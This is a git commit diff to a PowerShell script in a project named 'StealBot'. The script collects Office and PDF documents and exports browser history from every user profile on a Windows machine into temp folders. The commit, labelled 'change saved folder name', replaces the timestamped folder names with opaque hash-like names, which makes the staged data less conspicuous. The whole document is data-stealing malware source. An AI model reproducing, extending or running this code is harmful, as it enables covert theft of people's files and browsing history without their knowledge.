b9ec26fe6ccd20c688fde95bb9e5bc355b508ae8
Nguyễn Quốc <87937440+nguyen-xuan-quoc@users.noreply.github.com>
2024-03-07 07:37:30 +0700

    change saved folder name

--- StealBot/StealHistoryAndDocument.ps1
+++ StealBot/StealHistoryAndDocument.ps1
@@ -1,6 +1,6 @@
 $extensions = @('.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf')
 
-$destinationFolder = "$env:tmp\documents_$((Get-Date).ToString('yyyyMMddHHmmss'))"
+$destinationFolder = "$env:tmp\21f64da1e5792c8295b964d159a14491"
 
 if (-not (Test-Path -Path $destinationFolder)) {
     New-Item -ItemType Directory -Path $destinationFolder -Force
@@ -278,8 +278,9 @@ function Get-BrowserData {
     }
 }
 
-$path = "$env:tmp\BrowserHistory_$((Get-Date).ToString('yyyyMMddHHmmss'))"
+$path = "$env:tmp\6d30b4e3442b4a5eef8dbc952a52cb3c"
 if(!(test-path $path)) {
     New-Item -ItemType Directory -Force -Path $path
 }
 Get-ChildItem C:\Users | ForEach-Object {Get-BrowserData -UserName $_.Name -ErrorAction SilentlyContinue} | Export-Csv $path\BrowserHistory.csv -NoTypeInformation -Force
+
